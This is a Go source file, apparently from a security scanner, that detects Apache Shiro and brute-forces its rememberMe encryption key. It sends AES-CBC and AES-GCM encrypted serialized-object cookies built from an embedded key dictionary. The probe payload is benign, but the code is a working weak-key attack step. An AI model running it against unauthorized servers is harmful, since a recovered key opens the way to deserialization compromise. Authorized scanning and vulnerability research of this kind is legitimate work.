package gopocs

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/http/httputil"
	"strings"
	"unicode/utf8"

	"github.com/P0lar1ght/argus/scanner/ddout"
	"github.com/P0lar1ght/argus/scanner/structs"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/retryablehttp-go"
	uuid "github.com/satori/go.uuid"
)

var CheckContent = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="

//go:embed dict/shirokeys.txt
var ShiroKeys string

func Randcase(len int) string {
	var container string
	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

const httpSemanticTranscriptEncoding = "http-semantic-transcript/v1"
const maxGoPocHTTPBodyBytes int64 = 1 << 20

func sendShiroRequest(url string, data string) bool {
	matched, _ := sendShiroRequestWithEvidence(url, data, "Shiro weak-key verification")
	return matched
}

func sendShiroRequestWithEvidence(url string, data string, label string) (bool, structs.GoPocExchange) {
	req, err := retryablehttp.NewRequest("GET", url, nil)
	if err != nil {
		return false, structs.GoPocExchange{}
	}
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	req.Header.Set("Cookie", "JSESSIONID="+Randcase(8)+";rememberMe="+data)

	resp, err := client.Do(req)
	if err != nil {
		return false, structs.GoPocExchange{}
	}

	defer resp.Body.Close()
	var SetCookieAll string
	for i := range resp.Header["Set-Cookie"] {
		SetCookieAll += resp.Header["Set-Cookie"][i]
	}
	matched := !strings.Contains(SetCookieAll, "rememberMe=deleteMe;")

	responseBody, truncated, readErr := readBoundedGoPocHTTPBody(resp.Body)
	exchange := httpGoPocExchange(label, resp.Request, nil, resp, responseBody)
	if truncated {
		exchange.Response += fmt.Sprintf("\nEvidence-Body-Status: truncated-at-%d-bytes", maxGoPocHTTPBodyBytes)
	}
	if readErr != nil {
		exchange.Response += "\nEvidence-Body-Status: read-error"
	}

	return matched, exchange
}

func readCompleteGoPocHTTPBody(reader io.Reader) ([]byte, error) {
	body, truncated, err := readBoundedGoPocHTTPBody(reader)
	if err != nil {
		return nil, fmt.Errorf("read HTTP evidence body: %w", err)
	}
	if truncated {
		return nil, fmt.Errorf("HTTP evidence body exceeds %d bytes", maxGoPocHTTPBodyBytes)
	}
	return body, nil
}

func readBoundedGoPocHTTPBody(reader io.Reader) ([]byte, bool, error) {
	body, err := io.ReadAll(io.LimitReader(reader, maxGoPocHTTPBodyBytes+1))
	if int64(len(body)) <= maxGoPocHTTPBodyBytes {
		return body, false, err
	}
	return body[:maxGoPocHTTPBodyBytes], true, err
}

func httpGoPocExchange(label string, request *http.Request, requestBody []byte, response *http.Response, responseBody []byte) structs.GoPocExchange {
	return structs.GoPocExchange{
		Label:    label,
		Request:  semanticHTTPRequestTranscript(request, requestBody),
		Response: semanticHTTPResponseTranscript(response, responseBody),
		Encoding: httpSemanticTranscriptEncoding,
	}
}

func semanticHTTPRequestTranscript(request *http.Request, body []byte) string {
	if request == nil {
		return semanticHTTPBody(body)
	}
	clone := request.Clone(request.Context())
	if len(body) == 0 {
		clone.Body = nil
		clone.GetBody = nil
		clone.ContentLength = 0
	} else {
		clone.Body = io.NopCloser(bytes.NewReader(body))
		clone.GetBody = func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewReader(body)), nil
		}
		clone.ContentLength = int64(len(body))
	}
	dump, err := httputil.DumpRequestOut(clone, false)
	if err != nil {
		return fmt.Sprintf("Method: %s\nURL: %s\n%s", request.Method, request.URL.String(), semanticHTTPBody(body))
	}
	return fmt.Sprintf("URL: %s\n%s\n%s", request.URL.String(), normalizeHTTPTranscript(dump), semanticHTTPBody(body))
}

func semanticHTTPResponseTranscript(response *http.Response, body []byte) string {
	if response == nil {
		return semanticHTTPBody(body)
	}
	clone := new(http.Response)
	*clone = *response
	clone.Body = io.NopCloser(bytes.NewReader(body))
	dump, err := httputil.DumpResponse(clone, false)
	if err != nil {
		return fmt.Sprintf("Status: %s\n%s", response.Status, semanticHTTPBody(body))
	}
	return fmt.Sprintf("%s\n%s", normalizeHTTPTranscript(dump), semanticHTTPBody(body))
}

func normalizeHTTPTranscript(dump []byte) string {
	return strings.TrimRight(strings.ReplaceAll(string(dump), "\r\n", "\n"), "\n")
}

func semanticHTTPBody(body []byte) string {
	encoded := base64.StdEncoding.EncodeToString(body)
	result := fmt.Sprintf("Body-Encoding: base64\nBody-Length: %d\nBody-Base64:\n%s", len(body), encoded)
	if stableHTTPText(body) {
		result += "\nBody-UTF8:\n" + string(body)
	}
	return result
}

func stableHTTPText(body []byte) bool {
	if !utf8.Valid(body) {
		return false
	}
	for _, character := range string(body) {
		if character == '\r' || character == 0x7f || (character < 0x20 && character != '\n' && character != '\t') {
			return false
		}
	}
	return true
}

func checkShiro(url string) bool {
	return sendShiroRequest(url, "123")
}

func Padding(plainText []byte, blockSize int) []byte {
	n := blockSize - len(plainText)%blockSize
	temp := bytes.Repeat([]byte{byte(n)}, n)
	plainText = append(plainText, temp...)
	return plainText
}

func AESCBCEncrypt(key []byte, Content []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	Content = Padding(Content, block.BlockSize())
	iv := uuid.NewV4().Bytes()
	blockMode := cipher.NewCBCEncrypter(block, iv)
	cipherText := make([]byte, len(Content))
	blockMode.CryptBlocks(cipherText, Content)
	return base64.StdEncoding.EncodeToString(append(iv[:], cipherText[:]...)), nil
}

func AESGCMEncrypt(key []byte, Content []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, 16)
	io.ReadFull(rand.Reader, nonce)
	aesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)
	ciphertext := aesgcm.Seal(nil, nonce, Content, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...)), nil
}

func checkKey(url string, shiroKey string, content []byte) (bool, string) {
	ok, mode, _ := checkKeyWithEvidence(url, shiroKey, content)
	return ok, mode
}

func checkKeyWithEvidence(url string, shiroKey string, content []byte) (bool, string, []structs.GoPocExchange) {
	keyDecrypt, _ := base64.StdEncoding.DecodeString(shiroKey)

	RememberMe, err := AESCBCEncrypt(keyDecrypt, content)
	if err != nil {
		return false, "", nil
	}
	ok, matched := sendShiroRequestWithEvidence(url, RememberMe, "Shiro CBC weak-key verification")
	if ok {
		// 确认一次，减少误报
		if confirmed, confirmation := sendShiroRequestWithEvidence(url, RememberMe, "Shiro CBC weak-key confirmation"); confirmed {
			return true, "cbc", []structs.GoPocExchange{matched, confirmation}
		}
	}

	RememberMe, err = AESGCMEncrypt(keyDecrypt, content)
	ok, matched = sendShiroRequestWithEvidence(url, RememberMe, "Shiro GCM weak-key verification")
	if err != nil {
		return false, "", nil
	}
	if ok {
		// 确认一次，减少误报
		if confirmed, confirmation := sendShiroRequestWithEvidence(url, RememberMe, "Shiro GCM weak-key confirmation"); confirmed {
			return true, "gcm", []structs.GoPocExchange{matched, confirmation}
		}
	}

	return false, "", nil

}

func ShiroKeyCheck(info *structs.HostInfo) {
	url := info.Url

	// 不是shiro目标
	gologger.AuditTimeLogger("[Go] [Shiro] detect shiro %v", url)
	if checkShiro(url) {
		return
	}

	content, _ := base64.StdEncoding.DecodeString(CheckContent)
	t := strings.ReplaceAll(ShiroKeys, "\r\n", "\n")
	ks := strings.Split(t, "\n")
	for _, key := range ks {
		gologger.AuditTimeLogger("[Go] [Shiro] try %v key: %v", url, key)
		ok, tp, exchanges := checkKeyWithEvidence(url, key, content)
		if ok && tp != "" {
			// gologger.Silent().Msgf("%v [%v] [%v]", url, key, tp)

			showData := fmt.Sprintf("Host: %v\nkey: %v\nmode: %v\n", url, key, tp)

			pocResult := structs.GoPocsResultType{
				PocName:     "Shiro Weak Key",
				Security:    "CRITICAL",
				Target:      url,
				InfoLeft:    showData,
				InfoRight:   "",
				Exchanges:   exchanges,
				Description: "shiro Key",
				ShowMsg:     fmt.Sprintf("%v [%v] [%v]", url, key, tp),
			}

			emitOutput(info, ddout.OutputMessage{
				Type:          "GoPoc",
				IP:            "",
				IPs:           nil,
				Port:          "",
				Protocol:      "",
				Web:           ddout.WebInfo{},
				Finger:        nil,
				Domain:        "",
				GoPoc:         pocResult,
				AdditionalMsg: "",
			})

			writeResult(info, pocResult)
			break
		}
	}
	gologger.AuditTimeLogger("[Go] [Shiro] ShiroKeyCheck return! %v", url)

}
